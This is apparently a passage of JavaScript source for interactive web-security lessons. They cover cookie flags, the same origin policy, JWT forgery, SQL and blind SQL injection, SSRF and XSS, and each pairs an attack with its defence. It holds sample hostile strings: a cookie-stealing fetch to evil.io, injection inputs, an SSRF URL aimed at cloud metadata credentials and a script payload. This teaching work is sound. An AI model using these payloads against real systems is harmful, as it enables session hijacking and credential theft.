  const FL = { none: [], s: ['Secure'], sh: ['Secure', 'HttpOnly'], all: ['Secure', 'HttpOnly', 'SameSite=Lax'] };
  const TH = {
    sniff: ['Sniffing on café Wi-Fi', 'Secure', 'The victim opens one plain http:// link to the site. The attacker on the same Wi-Fi watches the traffic.'],
    xss: ['XSS steals document.cookie', 'HttpOnly', 'An injected script on the page runs fetch("https://evil.io/?c=" + document.cookie).'],
    csrf: ['Cross site request (CSRF)', 'SameSite=Lax', 'An evil page auto submits a hidden form: POST https://bank.example/transfer.']
  };
  trace('cycookie', {
    title: 'Session cookies: which flag stops which attack',
    sub: 'After login the server gives the browser a session cookie, and the browser sends it with every later request. Whoever holds the cookie is logged in. Three cookie flags each block a different way of abusing it.',
    W: 600, H: 340,
    params: [
      { k: 'fl', label: 'Cookie flags', type: 'select', v: 'none', opts: [['none', 'none'], ['s', 'Secure'], ['sh', 'Secure; HttpOnly'], ['all', 'Secure; HttpOnly; SameSite=Lax']] },
      { k: 'th', label: 'Attack', type: 'select', v: 'sniff', opts: [['sniff', 'Sniffing'], ['xss', 'XSS cookie theft'], ['csrf', 'Cross site request']] }
    ],
    tips: [
      { t: 'Play sniffing with no flags. The cookie crosses the network in plain text and the attacker logs in as the victim.', play: true },
      { t: 'Add Secure. The browser never sends the cookie over plain HTTP, so there is nothing to sniff.', set: { fl: 's' }, play: true },
      { t: 'Keep Secure and choose XSS. Secure does not help, because the script runs inside the real HTTPS page.', set: { fl: 's', th: 'xss' }, play: true },
      { t: 'Use all three flags against a cross site request. SameSite=Lax keeps the cookie off the forged POST.', set: { fl: 'all', th: 'csrf' }, play: true }
    ],
    frames(p) {
      const flags = FL[p.fl], [tname, need, how] = TH[p.th], blocked = flags.includes(need);
      const hdr = 'Set-Cookie: sid=8f3a91c2' + (flags.length ? '; ' + flags.join('; ') : '');
      const fr = [
        { st: 1, say: 'The user logs in: POST /login with a user name and password over HTTPS.' },
        { st: 2, say: `The server checks the password, creates a random session id and replies with <code>${hdr}</code>.` },
        { st: 3, say: 'Every later request to the site carries Cookie: sid=8f3a91c2. The server looks the id up and knows who you are. The cookie is as good as the password while it lasts.' },
        { st: 4, say: `Attack: ${tname}. ${how}` },
        { st: 5, done: true, blocked, say: blocked ? `Blocked by <b>${need}</b>. ${need === 'Secure' ? 'The browser refuses to put a Secure cookie on a plain HTTP request.' : need === 'HttpOnly' ? 'document.cookie does not show HttpOnly cookies, so the script gets nothing. The XSS itself is still a serious bug.' : 'With SameSite=Lax the browser sends the cookie on top level link clicks but not on cross site POSTs or background requests, so the forged transfer arrives logged out.'}` : `Not blocked. The attacker ${p.th === 'csrf' ? 'makes the victim’s own browser send the request with the cookie, so the bank sees a genuine logged in transfer' : 'now has sid=8f3a91c2 and can paste it into their own browser'}. The flag that stops this is <b>${need}</b>.` }
      ];
      return fr.map(x => ({ ...x, flags, tname, need, hdr, th: p.th }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 20, 140, 60, ['Browser', 'victim'], { s: 13, b: true, fill: col.surf });
      cbox(z, 446, 20, 140, 60, ['Server', 'bank.example'], { s: 13, b: true, fill: col.surf });
      if (f.st >= 1) { D.arrow(g, 154, 36, 446, 36, col.ink2, 2); D.text(g, 'POST /login  user + password', 300, 30, { a: 'center', s: 11, c: col.ink2 }); }
      if (f.st >= 2) { D.arrow(g, 446, 64, 154, 64, col.cv, 2); cbox(z, 160, 70, 280, 24, f.hdr, { s: 10, b: true, mono: true, fill: col.bg }); }
      if (f.st >= 3) { D.arrow(g, 154, 112, 446, 112, col.ink2, 2); D.text(g, 'GET /account   Cookie: sid=8f3a91c2', 300, 106, { a: 'center', s: 11, mono: true, c: col.ink2 }); }
      ['Secure', 'HttpOnly', 'SameSite=Lax'].forEach((t, i) => cbox(z, 14 + i * 120, 130, 112, 26, t, { s: 11, b: true, fill: f.flags.includes(t) ? col.cv : col.bg, c: f.flags.includes(t) ? '#fff' : col.ink2 }));
      if (f.st >= 4) {
        cbox(z, 200, 180, 200, 54, ['Attacker', f.tname], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
        if (f.th === 'sniff') D.arrow(g, 300, 180, 300, 120, col.red, 2);
        if (f.th === 'xss') D.arrow(g, 200, 200, 90, 80, col.red, 2);
        if (f.th === 'csrf') { D.arrow(g, 260, 180, 90, 80, col.red, 2); D.arrow(g, 154, 78, 446, 160, col.orange, 2); }
        cbox(z, 380, 130, 206, 26, `needs ${f.need}`, { s: 11, b: true, fill: col.surf });
      }
      if (f.st >= 5) cbox(z, 14, 250, 572, 40, f.blocked ? 'attacker gets nothing useful' : f.th === 'csrf' ? 'forged request arrives with the victim’s cookie' : 'attacker now holds sid=8f3a91c2', { s: 13, b: true, mono: false, fill: f.blocked ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.2)' });
      if (f.done) cbox(z, 14, 306, 572, 28, f.blocked ? `blocked by ${f.need}` : `session hijacked: add ${f.need}`, { s: 13, b: true, fill: f.blocked ? col.cv : col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.1  The same origin policy: scheme, host and port, compared one by one
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const PAGE = ['https', 'shop.example.com', '443'];
  const URLS = {
    a: ['https://shop.example.com/account', ['https', 'shop.example.com', '443']],
    b: ['http://shop.example.com/cart', ['http', 'shop.example.com', '80']],
    c: ['https://api.example.com/cart', ['https', 'api.example.com', '443']],
    d: ['https://shop.example.com:8443/', ['https', 'shop.example.com', '8443']],
    e: ['https://shop.example.com.evil.io/', ['https', 'shop.example.com.evil.io', '443']]
  };
  trace('cysop', {
    title: 'Same origin policy: can this page read that response?',
    sub: 'A script on one origin may send requests anywhere, but may only read responses from its own origin. The origin is the triple scheme, host and port, and all three must match exactly. CORS is how a server opts in to sharing with other origins.',
    W: 600, H: 340,
    params: [
      { k: 'u', label: 'Script on https://shop.example.com fetches', type: 'select', v: 'c', opts: Object.entries(URLS).map(([k, v]) => [k, v[0]]) },
      { k: 'cors', label: 'Server reply header', type: 'select', v: 'no', opts: [['no', 'no CORS header'], ['yes', 'Access-Control-Allow-Origin: https://shop.example.com']] }
    ],
    tips: [
      { t: 'Play the api subdomain. One different label in the host is enough to make it another origin.', play: true },
      { t: 'Turn on the CORS header. The API server now tells the browser it is happy to share with the shop.', set: { cors: 'yes' }, play: true },
      { t: 'Try the look alike host. It starts with shop.example.com but is a completely different site.', set: { u: 'e', cors: 'no' }, play: true }
    ],
    frames(p) {
      const [url, o] = URLS[p.u], same = o.every((v, i) => v === PAGE[i]);
      const names = ['scheme', 'host', 'port'], fr = [];
      fr.push({ st: 0, n: 0, say: `The page is https://shop.example.com, so its origin is (https, shop.example.com, 443). A script on it calls fetch("${url}").` });
      names.forEach((nm, i) => fr.push({ st: 1, n: i + 1, say: `${nm}: page ${PAGE[i]}, target ${o[i]}. ${o[i] === PAGE[i] ? 'Match.' : '<b>Different.</b>'}${i === 2 && p.u === 'b' ? ' The port differs too, because http defaults to 80 and https to 443.' : ''}` }));
      const ok = same || p.cors === 'yes';
      fr.push({ st: 2, done: true, n: 3, same, ok, say: same ? 'Same origin: the script can read the response. Cookies for the site go along as normal.' : ok ? 'Different origin, but the response carries Access-Control-Allow-Origin naming the shop, so the browser lets the script read it. A server should list exact origins and never reflect any Origin it is sent while also allowing credentials.' : 'Different origin and no CORS permission. The request may still reach the server, but the browser hides the response from the script. This is what stops evil.io from reading your webmail through your logged in browser.' });
      return fr.map(x => ({ ...x, url, o }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, names = ['scheme', 'host', 'port'], X = [120, 230, 470], Wd = [100, 230, 100];
      D.text(g, 'page', 60, 62, { a: 'center', s: 12, b: true, c: col.ink2 }); D.text(g, 'target', 60, 112, { a: 'center', s: 12, b: true, c: col.ink2 });
      names.forEach((nm, i) => {
        D.text(g, nm, X[i] + Wd[i] / 2, 34, { a: 'center', s: 11, b: true, c: col.ink2 });
        cbox(z, X[i], 44, Wd[i], 32, PAGE[i], { s: 12, b: true, mono: true, fill: col.surf });
        if (f.n > i) { const m = f.o[i] === PAGE[i]; cbox(z, X[i], 94, Wd[i], 32, f.o[i], { s: 12, b: true, mono: true, fill: m ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.2)' }); D.text(g, m ? '=' : '≠', X[i] + Wd[i] / 2, 90, { a: 'center', s: 14, b: true, c: m ? col.cv : col.red }); }
      });
      cbox(z, 14, 150, 572, 30, `fetch("${f.url}")`, { s: 12, b: true, mono: true, fill: col.bg });
      if (f.done) {
        cbox(z, 14, 200, 572, 60, f.same ? ['same origin', 'response readable'] : f.ok ? ['cross origin, allowed by CORS', 'response readable'] : ['cross origin, no CORS', 'request may be sent, response hidden from the script'], { s: 13, b: true, fill: f.ok ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.15)' });
        cbox(z, 14, 306, 572, 28, f.ok ? 'script can read the response' : 'blocked by the same origin policy', { s: 13, b: true, fill: f.ok ? col.cv : col.red, c: '#fff' });
      }
    }
  });
})();

/* =====================================================================================================
   Application Security 1.1  A JWT signed with HS256, verified step by step, and three forgery attempts
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D, sha256, utf8 } = CYZ;
  const hmac = (key, msg) => {
    let k = key.length > 64 ? sha256(key) : key.slice();
    while (k.length < 64) k.push(0);
    return sha256(k.map(b => b ^ 0x5c).concat(sha256(k.map(b => b ^ 0x36).concat(msg))));
  };
  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
  const b64u = bytes => { let s = ''; for (let i = 0; i < bytes.length; i += 3) { const n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0), m = Math.min(3, bytes.length - i) + 1; for (let j = 0; j < m; j++) s += A[(n >> (18 - 6 * j)) & 63]; } return s; };
  const KEY = utf8('server-secret-key-32-bytes-long!'), NOW = 1700000000;
  const enc = o => b64u(utf8(JSON.stringify(o)));
  const H = enc({ alg: 'HS256', typ: 'JWT' }), P = enc({ sub: 'alice', role: 'user', exp: NOW + 900 });
  const SIG = b64u(hmac(KEY, utf8(H + '.' + P)));
  trace('cyjwt', {
    title: 'JSON Web Tokens: signed, not secret',
    sub: 'A JWT is three base64url parts joined by dots: header, payload and signature. The server signs header.payload with HMAC-SHA-256 and a secret key. Anyone can read the payload, but nobody without the key can change it unnoticed.',
    W: 600, H: 340,
    params: [
      { k: 'atk', label: 'Token presented', type: 'select', v: 'role', opts: [['ok', 'the genuine token'], ['role', 'payload edited to role admin'], ['none', 'header alg none, no signature'], ['exp', 'genuine token, 16 minutes later']] }
    ],
    tips: [
      { t: 'Play the edited payload. Changing role to admin changes the bytes that were signed, so the signature no longer matches.', play: true },
      { t: 'Try alg none. Old libraries trusted the header’s choice of algorithm and skipped the check. The server must fix the algorithm itself.', set: { atk: 'none' }, play: true },
      { t: 'Present the genuine token later. A valid signature does not help once exp has passed.', set: { atk: 'exp' }, play: true }
    ],
    frames(p) {
      const a = p.atk;
      const hdr = a === 'none' ? enc({ alg: 'none', typ: 'JWT' }) : H;
      const pay = a === 'role' || a === 'none' ? enc({ sub: 'alice', role: 'admin', exp: NOW + 900 }) : P;
      const sig = a === 'none' ? '' : SIG;
      const good = b64u(hmac(KEY, utf8(hdr + '.' + pay)));
      const now = a === 'exp' ? NOW + 960 : NOW;
      const step2 = a === 'none' ? 'fail' : 'ok', step3 = a === 'none' ? 'skip' : good === sig ? 'ok' : 'fail', step4 = step3 !== 'ok' ? 'skip' : now > NOW + 900 ? 'fail' : 'ok';
      const valid = step2 === 'ok' && step3 === 'ok' && step4 === 'ok';
      const fr = [
        { st: 1, say: `The server issued a token for alice with role user, valid for 15 minutes. Header ${H.slice(0, 20)}..., payload ${P.slice(0, 20)}..., signature ${SIG.slice(0, 16)}...` },
        { st: 2, say: `The client presents a token. ${a === 'ok' ? 'It is the genuine one.' : a === 'role' ? 'The attacker decoded the payload, changed "user" to "admin" and encoded it again. Easy, since base64url is not encryption.' : a === 'none' ? 'The attacker set the header to {"alg":"none"}, changed the role and dropped the signature.' : 'It is the genuine token, but 16 minutes have passed.'}` },
        { st: 3, c2: step2, say: step2 === 'ok' ? 'Check 1: the header says HS256, the only algorithm this server accepts.' : 'Check 1: the header says alg none. The server accepts only HS256, so it rejects the token here. Libraries before 2015 often skipped verification for none.' },
        { st: 4, c2: step2, c3: step3, say: step3 === 'skip' ? 'Check 2 is not reached.' : `Check 2: recompute HMAC-SHA-256(key, header.payload) = ${good.slice(0, 16)}... and compare in constant time with the token’s ${sig.slice(0, 16)}... ${step3 === 'ok' ? 'They match.' : '<b>They differ</b>: the payload was changed.'}` },
        { st: 5, c2: step2, c3: step3, c4: step4, say: step4 === 'skip' ? 'Check 3 is not reached.' : `Check 3: exp is ${NOW + 900}, now is ${now}. ${step4 === 'ok' ? 'Still valid.' : '<b>Expired.</b>'}` },
        { st: 6, done: true, c2: step2, c3: step3, c4: step4, valid, say: valid ? 'Accepted: the server trusts sub alice and role user without a database lookup. That is the appeal of JWTs, and also the catch: a stolen token works until it expires, so keep lifetimes short.' : 'Rejected. Never put secrets in a JWT payload, always fix the algorithm on the server, use a long random key (at least 256 bits for HS256), and check exp, iss and aud.' }
      ];
      return fr.map(x => ({ ...x, hdr, pay, sig, a }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      if (f.st >= 1) { cbox(z, 14, 14, 186, 44, ['header', '{"alg":"HS256"}'], { s: 11, b: true, mono: true, fill: 'rgba(225,29,72,0.12)' }); cbox(z, 207, 14, 186, 44, ['payload', '{"sub":"alice","role":"user"}'], { s: 11, b: true, mono: true, fill: 'rgba(124,58,237,0.12)' }); cbox(z, 400, 14, 186, 44, ['signature', SIG.slice(0, 18) + '…'], { s: 11, b: true, mono: true, fill: 'rgba(15,118,110,0.15)' }); }
      if (f.st >= 2) {
        const ed = f.a === 'role' || f.a === 'none';
        cbox(z, 14, 72, 186, 44, ['presented header', f.a === 'none' ? '{"alg":"none"}' : '{"alg":"HS256"}'], { s: 11, b: true, mono: true, fill: f.a === 'none' ? col.red : col.surf, c: f.a === 'none' ? '#fff' : col.ink });
        cbox(z, 207, 72, 186, 44, ['presented payload', ed ? '{..."role":"admin"}' : '{..."role":"user"}'], { s: 11, b: true, mono: true, fill: ed ? col.red : col.surf, c: ed ? '#fff' : col.ink });
        cbox(z, 400, 72, 186, 44, ['presented signature', f.sig ? f.sig.slice(0, 18) + '…' : '(empty)'], { s: 11, b: true, mono: true, fill: col.surf });
      }
      const chk = (y, label, v) => { if (!v) return; cbox(z, 14, y, 420, 34, label, { s: 12, b: true, fill: col.surf }); cbox(z, 444, y, 142, 34, v === 'ok' ? 'pass' : v === 'fail' ? 'FAIL' : 'not reached', { s: 13, b: true, fill: v === 'ok' ? col.cv : v === 'fail' ? col.red : col.bg, c: v === 'skip' ? col.ink2 : '#fff' }); };
      chk(134, '1. algorithm is the one the server expects (HS256)', f.c2);
      chk(176, '2. HMAC-SHA-256(key, header.payload) equals signature', f.c3);
      chk(218, '3. exp is in the future', f.c4);
      if (f.done) cbox(z, 14, 306, 572, 28, f.valid ? 'token accepted' : 'token rejected', { s: 13, b: true, fill: f.valid ? col.cv : col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.2  SQL injection: how input turns into code, and how parameters keep it data
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const CASES = {
    normal: { n: 'bob', p: 'h_91cc', sql: "... WHERE name = 'bob' AND password_hash = 'h_91cc'", chips: [['WHERE name =', 'code'], ["'bob'", 'data'], ['AND password_hash =', 'code'], ["'h_91cc'", 'data']], rows: ['bob | user'], why: 'Both values sit inside quotes as data. One matching row.' },
    comment: { n: "alice' --", p: 'x', sql: "... WHERE name = 'alice' --' AND password_hash = 'x'", chips: [['WHERE name =', 'code'], ["'alice'", 'data'], ['--', 'inj'], ["' AND password_hash = 'x'", 'gone']], rows: ['alice | admin'], why: 'The quote in the input closed the string early, and -- turned the password check into a comment. Logged in as alice, an admin, with no password.' },
    taut: { n: "' OR '1'='1", p: "' OR '1'='1", sql: "... WHERE name = '' OR '1'='1' AND password_hash = '' OR '1'='1'", chips: [['WHERE name =', 'code'], ["''", 'data'], ['OR', 'inj'], ["'1'='1'", 'inj'], ['AND password_hash =', 'code'], ["''", 'data'], ['OR', 'inj'], ["'1'='1'", 'inj']], rows: ['alice | admin', 'bob | user'], why: "The input added OR '1'='1', which is always true, so the WHERE clause matches every row. Many apps log in as the first row, often the admin." }
  };
  trace('cysqli', {
    title: 'SQL injection: when data becomes code',
    sub: 'A login builds its SQL by pasting what the user typed between quotes. A quote in the input ends the string early, and whatever follows is read as SQL. Parameterised queries send the query and the data separately, so input can never change the query’s shape.',
    W: 600, H: 340,
    params: [
      { k: 'c', label: 'User types (name / password)', type: 'select', v: 'comment', opts: [['normal', "bob / h_91cc"], ['comment', "alice' -- / x"], ['taut', "' OR '1'='1 / same"]] },
      { k: 'm', label: 'Code', type: 'select', v: 'concat', opts: [['concat', 'string building (f-string)'], ['param', 'parameterised query (?)']] }
    ],
    tips: [
      { t: 'Play the comment trick with string building. Two dashes cut off the password check.', play: true },
      { t: 'Switch to the parameterised query. The same text is now only a strange user name, and nothing matches.', set: { m: 'param' }, play: true },
      { t: 'Try the always true input with string building. Every row comes back.', set: { c: 'taut', m: 'concat' }, play: true }
    ],
    frames(p) {
      const C = CASES[p.c], par = p.m === 'param';
      const rows = par ? (p.c === 'normal' ? ['bob | user'] : []) : C.rows;
      const fr = [
        { st: 1, say: par ? 'The code: execute("SELECT name, role FROM users WHERE name = ? AND password_hash = ?", (name, pw)). The query text never changes.' : 'The code: execute(f"SELECT name, role FROM users WHERE name = \'{name}\' AND password_hash = \'{pw}\'"). The input is pasted inside the quotes.' },
        { st: 2, say: `The user types name <code>${C.n}</code> and password <code>${C.p}</code>.` },
        { st: 3, say: par ? 'The database receives the fixed query with two placeholders, and separately the two values. It parses the query first, so the values can only ever be data.' : `The database receives <code>${C.sql}</code> and parses it. The chips show how the parser reads it.` },
        { st: 4, done: true, say: par ? (rows.length ? 'One matching row, as expected.' : `No user is literally named <code>${C.n}</code>, so no rows. The attack text was harmless.`) + ' Parameterised queries are the main defence against SQL injection, with least privilege database accounts behind them.' : C.why }
      ];
      return fr.map(x => ({ ...x, C, par, rows, c: p.c }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, C = f.C;
      cbox(z, 14, 12, 572, 34, f.par ? "WHERE name = ? AND password_hash = ?" : "WHERE name = '{name}' AND password_hash = '{pw}'", { s: 12, b: true, mono: true, fill: f.par ? 'rgba(15,118,110,0.15)' : col.surf });
      if (f.st >= 2) { cbox(z, 14, 56, 280, 34, ['name', C.n], { s: 11, b: true, mono: true, fill: col.bg }); cbox(z, 306, 56, 280, 34, ['password', C.p], { s: 11, b: true, mono: true, fill: col.bg }); }
      if (f.st >= 3) {
        if (f.par) {
          cbox(z, 14, 104, 572, 30, 'query: WHERE name = ? AND password_hash = ?', { s: 12, b: true, mono: true, fill: col.surf });
          cbox(z, 14, 142, 280, 30, `data 1: "${C.n}"`, { s: 12, b: true, mono: true, fill: 'rgba(124,58,237,0.15)' });
          cbox(z, 306, 142, 280, 30, `data 2: "${C.p}"`, { s: 12, b: true, mono: true, fill: 'rgba(124,58,237,0.15)' });
        } else {
          let x = 14, y = 104;
          C.chips.forEach(([t, k]) => {
            const w = Math.max(40, t.length * 7.2 + 14);
            if (x + w > 586) { x = 14; y += 38; }
            cbox(z, x, y, w, 30, t, { s: 11, b: true, mono: true, fill: k === 'code' ? col.surf : k === 'data' ? 'rgba(124,58,237,0.15)' : k === 'inj' ? col.red : col.bg, c: k === 'inj' ? '#fff' : k === 'gone' ? col.ink2 : col.ink });
            if (k === 'gone') D.line(g, x + 4, y + 15, x + w - 4, y + 15, col.ink2, 1.5);
            x += w + 6;
          });
          D.text(g, 'grey = SQL code   purple = data   red = SQL the attacker wrote   struck = comment, ignored', 14, 196, { s: 10, c: col.ink2 });
        }
      }
      if (f.st >= 4) {
        D.text(g, 'rows returned', 14, 222, { s: 11, b: true, c: col.ink2 });
        if (!f.rows.length) cbox(z, 14, 230, 200, 28, '(none)', { s: 12, b: true, mono: true, fill: col.bg });
        f.rows.forEach((r, i) => cbox(z, 14 + i * 210, 230, 200, 28, r, { s: 12, b: true, mono: true, fill: r.includes('admin') && f.c !== 'normal' ? 'rgba(225,29,72,0.2)' : col.surf }));
      }
      if (f.done) { const bad = !f.par && f.c !== 'normal'; cbox(z, 14, 306, 572, 28, bad ? 'injection: the input changed the query' : 'safe: the query shape did not change', { s: 13, b: true, fill: bad ? col.red : col.cv, c: '#fff' }); }
    }
  });
})();

/* =====================================================================================================
   Application Security 1.2  Blind SQL injection: binary search on one secret character, yes or no at a time
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyblind', {
    title: 'Blind SQL injection: leaking a secret with yes or no questions',
    sub: 'The page shows no data, only "found" or "not found". The attacker injects a condition such as unicode(substr(token, 1, 1)) > 79 and watches which answer comes back. Halving the range each time finds any printable character in at most 7 questions.',
    W: 600, H: 340,
    params: [
      { k: 'ch', label: 'Secret character', type: 'select', v: 'K', opts: [['K', 'K (75)'], ['9', '9 (57)'], ['q', 'q (113)'], ['~', '~ (126)']] }
    ],
    tips: [
      { t: 'Play K. Seven questions, each cutting the range in half, from 95 possibilities down to one.', play: true },
      { t: 'Try ~, the last printable character. Only 6 questions this time: binary search never needs more than 7, wherever the answer lies.', set: { ch: '~' }, play: true }
    ],
    frames(p) {
      const code = p.ch.charCodeAt(0), fr = [];
      let lo = 32, hi = 126, q = 0;
      fr.push({ st: 0, lo, hi, q, say: `The secret is one printable ASCII character, a code from 32 to 126: ${hi - lo + 1} possibilities.` });
      while (lo < hi) {
        const mid = (lo + hi) >> 1, yes = code > mid; q++;
        const before = [lo, hi];
        if (yes) lo = mid + 1; else hi = mid;
        fr.push({ st: 1, lo, hi, q, mid, yes, before, say: `Question ${q}: inject <code>unicode(substr(token,1,1)) &gt; ${mid}</code>. The page says <b>${yes ? 'found' : 'not found'}</b>, so the code is ${yes ? 'above' : 'at most'} ${mid}. Range now ${lo} to ${hi} (${hi - lo + 1} left).` });
      }
      fr.push({ st: 2, done: true, lo, hi, q, say: `Found: code ${lo} is "${String.fromCharCode(lo)}" after ${q} questions. A 32 character token takes about 224 requests, a few seconds for a tool such as sqlmap. Time based blind injection works the same way with SLEEP() when even the found or not found difference is hidden. The fix is the same as before: parameterised queries.` });
      return fr.map(x => ({ ...x, code }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 30, R = 570, Y = 120, X = c => L + (R - L) * (c - 32) / 94;
      D.line(g, L, Y, R, Y, col.line, 2);
      [32, 48, 64, 80, 96, 112, 126].forEach(c => { D.line(g, X(c), Y - 4, X(c), Y + 4, col.line, 1.5); D.text(g, `${c} ${String.fromCharCode(c) === ' ' ? 'space' : String.fromCharCode(c)}`, X(c), Y + 20, { a: 'center', s: 10, c: col.ink2 }); });
      D.rect(g, X(f.lo) - 2, Y - 18, Math.max(4, X(f.hi) - X(f.lo) + 4), 36, { fill: 'rgba(15,118,110,0.25)' });
      if (f.mid != null) { D.line(g, X(f.mid), Y - 34, X(f.mid), Y + 30, col.orange, 2.5); cbox(z, Math.min(Math.max(X(f.mid) - 70, 14), 446), 40, 140, 30, `> ${f.mid}? ${f.yes ? 'yes' : 'no'}`, { s: 12, b: true, mono: true, fill: f.yes ? 'rgba(15,118,110,0.2)' : 'rgba(225,29,72,0.15)' }); }
      cbox(z, 14, 170, 280, 50, ['questions asked', `${f.q}`], { s: 14, b: true, fill: col.surf });
      cbox(z, 306, 170, 280, 50, ['candidates left', `${f.hi - f.lo + 1}`], { s: 14, b: true, fill: col.surf });
      cbox(z, 14, 232, 572, 30, `log2(95) = 6.57, so at most 7 questions per character`, { s: 12, b: true, fill: col.bg });
      if (f.done) cbox(z, 14, 306, 572, 28, `secret character "${String.fromCharCode(f.lo)}" (code ${f.lo}) found in ${f.q} questions`, { s: 13, b: true, fill: col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.2  SSRF: a URL preview feature aimed at the cloud metadata service
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const U = {
    pub: ['https://images.example.org/cat.png', '93.184.216.34', false, 'a cat picture'],
    meta: ['http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role', '169.254.169.254', true, 'AccessKeyId, SecretAccessKey, Token'],
    int: ['http://10.0.0.12/admin', '10.0.0.12', true, 'the internal admin panel'],
    dec: ['http://2130706433:8080/debug', '127.0.0.1', true, 'a debug page on the server itself']
  };
  trace('cyssrf', {
    title: 'Server side request forgery (SSRF)',
    sub: 'The app offers "paste a link and we show a preview". The server fetches the URL from inside the network, where it can reach addresses the attacker cannot: internal services and the cloud metadata service that hands out the server’s credentials.',
    W: 600, H: 340,
    params: [
      { k: 'u', label: 'URL the user submits', type: 'select', v: 'meta', opts: [['pub', 'public image'], ['meta', 'cloud metadata 169.254.169.254'], ['int', 'internal 10.0.0.12'], ['dec', '2130706433 (127.0.0.1 in disguise)']] },
      { k: 'g', label: 'Server check', type: 'select', v: 'off', opts: [['off', 'none'], ['on', 'resolve, block private and link local addresses']] }
    ],
    tips: [
      { t: 'Play the metadata URL with no check. The server fetches its own cloud credentials and shows them to the attacker.', play: true },
      { t: 'Turn on the check. The server resolves the host, sees a link local address and refuses.', set: { g: 'on' }, play: true },
      { t: 'Try the disguised loopback address. A filter that only looks for the text "127.0.0.1" misses it, but checking the resolved address catches it.', set: { u: 'dec', g: 'on' }, play: true }
    ],
    frames(p) {
      const [url, ip, internal, prize] = U[p.u], guard = p.g === 'on', blocked = guard && internal;
      const fr = [
        { st: 1, say: `The attacker submits <code>${url}</code> to the preview feature.` },
        { st: 2, say: `The server resolves the host to <b>${ip}</b>. ${internal ? 'That address is not on the internet: it is inside the cloud network or on the server itself.' : 'A normal public address.'}` },
        { st: 3, blocked, say: guard ? (blocked ? `The check finds ${ip} in a blocked range (${ip.startsWith('169.254') ? 'link local' : ip.startsWith('127') ? 'loopback' : 'private 10.0.0.0/8'}) and refuses.` : 'The check allows a public address.') : 'No check: the server fetches whatever it was given.' },
        { st: 4, done: true, blocked, say: blocked ? 'Blocked. Also connect only to the address you checked, so a second DNS lookup cannot swap it (DNS rebinding), turn off redirects, and on AWS require IMDSv2, which needs a PUT with a session token that a simple SSRF cannot send.' : internal ? `The server fetched ${prize} and returned it in the preview. In 2019 an SSRF like this let an attacker take Capital One’s cloud credentials and copy data on about 106 million people.` : 'A normal preview. The feature is useful, which is why it must be guarded rather than removed.' }
      ];
      return fr.map(x => ({ ...x, url, ip, internal, prize, guard }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 20, 120, 54, ['Attacker', 'internet'], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
      D.rect(g, 170, 8, 416, 270, { fill: 'rgba(15,118,110,0.06)', stroke: col.line });
      D.text(g, 'cloud network', 180, 24, { s: 11, b: true, c: col.ink2 });
      cbox(z, 190, 34, 160, 54, ['Web server', 'preview feature'], { s: 12, b: true, fill: col.surf });
      cbox(z, 410, 34, 166, 46, ['metadata service', '169.254.169.254'], { s: 11, b: true, fill: f.internal && f.ip.startsWith('169') ? 'rgba(234,88,12,0.2)' : col.bg });
      cbox(z, 410, 92, 166, 46, ['internal admin', '10.0.0.12'], { s: 11, b: true, fill: f.ip === '10.0.0.12' ? 'rgba(234,88,12,0.2)' : col.bg });
      cbox(z, 190, 110, 160, 40, ['loopback', '127.0.0.1'], { s: 11, b: true, fill: f.ip === '127.0.0.1' ? 'rgba(234,88,12,0.2)' : col.bg });
      cbox(z, 14, 210, 140, 46, ['public site', '93.184.216.34'], { s: 11, b: true, fill: f.ip === '93.184.216.34' ? 'rgba(234,88,12,0.2)' : col.bg });
      if (f.st >= 1) { D.arrow(g, 134, 46, 190, 56, col.red, 2); cbox(z, 14, 84, 150, 24, 'POST /preview url=…', { s: 10, b: true, mono: true, fill: col.surf }); }
      if (f.st >= 2) cbox(z, 190, 164, 160, 28, `resolves to ${f.ip}`, { s: 11, b: true, mono: true, fill: col.bg });
      if (f.st >= 3 && f.guard) cbox(z, 190, 200, 160, 28, f.blocked ? 'check: BLOCK' : 'check: allow', { s: 12, b: true, fill: f.blocked ? col.cv : col.surf, c: f.blocked ? '#fff' : col.ink });
      if (f.st >= 4 && !f.blocked) {
        const tx = f.ip.startsWith('169') ? [410, 57] : f.ip.startsWith('10.') ? [410, 115] : f.ip.startsWith('127') ? [270, 110] : [154, 233];
        D.arrow(g, 350, 70, tx[0], tx[1], col.orange, 2.5);
        cbox(z, 190, 240, 386, 30, `returned to attacker: ${f.prize}`, { s: 11, b: true, fill: f.internal ? col.red : col.surf, c: f.internal ? '#fff' : col.ink });
      }
      if (f.done) cbox(z, 14, 306, 572, 28, f.blocked ? 'SSRF blocked by the address check' : f.internal ? 'SSRF: internal data leaked' : 'normal fetch of a public URL', { s: 13, b: true, fill: f.blocked || !f.internal ? col.cv : col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.3  Cross site scripting: stored and reflected, with encoding or a strict CSP
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const PAY = '<script>steal()</script>';
  trace('cyxss', {
    title: 'Cross site scripting (XSS): the attacker’s script runs on your site',
